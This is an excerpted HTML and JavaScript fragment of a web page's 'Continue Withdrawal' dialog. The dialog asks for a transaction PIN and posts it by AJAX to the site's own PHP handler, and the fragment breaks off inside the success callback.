...
<div class="page-content">
    ...
    <aside id="resumeDialog" class="" style="z-index: 999999;">
        <div id="mainStuff" class="block">
            <div>
                <h1>Continue Withdrawal</h1>
                <p>Please enter your transaction pin to continue.</p>
                <p>Please do not share your code with anyone.</p>
                <p>I don't have it? <a>Contact support</a></p>
            </div>
    ...
    <script>
        let mmqza = false;
        const validatePinAndSubmitForm = () => {
            resume();
            // alert('hey')
            document.getElementById('sumi').onclick = () => {
                ...
                $.ajax({
                        url: 'server/classes/handleRequest.php?_mode=pin',
                        type: 'POST',
                        dataType: 'json',
                        data: dat
                    })
                    .done(function(response) {
                        if (response.status == 11) {
                            document.getElementById('mess-cont').innerHTML = '<p class="text-success">Success. Your pin has been verified. Please wait...</p>';
                            setTimeout(()=>{
                                resumeClose();
                                mmqza = true;
